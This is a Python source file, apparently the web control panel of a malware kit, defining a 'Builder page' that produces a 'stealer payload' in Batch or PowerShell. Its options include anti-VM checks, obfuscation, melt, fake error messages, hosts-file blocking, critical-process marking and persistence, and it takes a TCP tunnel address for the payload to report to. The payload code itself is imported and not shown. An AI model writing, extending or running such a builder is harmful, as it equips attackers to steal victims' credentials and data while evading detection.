from panel.ui.modules.builder.main import BuildPayload

from panel.ui.media.images import Images

from nicegui import ui


def builder() -> None:
    """Builder page to build the stealer payload."""
    languages = ["Batch", "Powershell"]
    uiimage = Images.get_image("Powershell")
    with ui.card().classes(
        "w-200 h-400 justify-center items-center no-shadow border-[1px] border-gray-200"
    ):
        ui.label("Builder page").classes("text-5xl w-full text-center font-bold")
        out_image = ui.image(uiimage).style("width: 200px; height: 200px")

        chosen_lang = (
            ui.select(
                languages,
                multiple=False,
                label="Stealer Language",
                value="Powershell",
                on_change=lambda value: out_image.set_source(change_image(value.value)),
            )
            .classes("w-full")
            .props("use-chips outlined")
        )

        checkbox_options = {
            "debug": "Debug",
            "blockhostsfile": "Block Hosts File",
            "criticalprocess": "Critical Process",
            "melt": "Melt",
            "fakeerror": "Fake Error",
            "persistence": "Persistence",
            "obfuscate": "Obfuscate",
            "anti_vm": "Anti-VM",
        }

        checkbox_values = {}

        with ui.splitter() as splitter:
            with splitter.before:
                for key, label in list(checkbox_options.items())[:4]:
                    checkbox_values[key] = ui.checkbox(label)
            with splitter.after:
                for key, label in list(checkbox_options.items())[4:]:
                    checkbox_values[key] = ui.checkbox(label)

        url = (
            ui.input("TCP TUNNEL URL:PORT", placeholder="example.com:12345")
            .on(
                "keydown.enter",
                lambda: build(
                    chosen_lang.value,
                    url.value,
                    {key: checkbox.value for key, checkbox in checkbox_values.items()},
                ),
            )
            .classes("w-full")
        )

        ui.button("Build").on_click(
            lambda: build(
                chosen_lang.value,
                url.value,
                {key: checkbox.value for key, checkbox in checkbox_values.items()},
            )
        ).classes("w-full py-4 text-lg")


def change_image(value: str) -> str:
    """Change the image based on the selected language.

    Args:
        value (str): Value of the selected language

    Returns:
        str: Returns the image based on the selected language
    """
    image = Images.get_image(value)
    return image


def build(language: str, url: str, options: dict[str, bool]) -> bool:
    """Build the payload based on the selected language and URL.

    Args:
        language (str): Language to build the payload in
        url (str): URL to build the payload with

    Returns:
        bool: Returns True if the payload was built successfully, False otherwise
    """
    if url.startswith("https://") or url.startswith("http://"):
        ui.notify("PLEASE DO NOT SPECIFCY HTTP/HTTPS://", type="negative")
        return False
    url = "https://" + url
    if language == None:
        ui.notify("Invalid language", type="negative")
        return False
    ui.notify(f"Building payload for {language} with URL {url}")
    payload_builder = BuildPayload()
    out_build = payload_builder.build(language=language, url=url, options=options)
    if out_build:
        ui.notify("Payload built successfully", type="positive")
    else:
        ui.notify("Failed to build payload", type="negative")
    return out_build
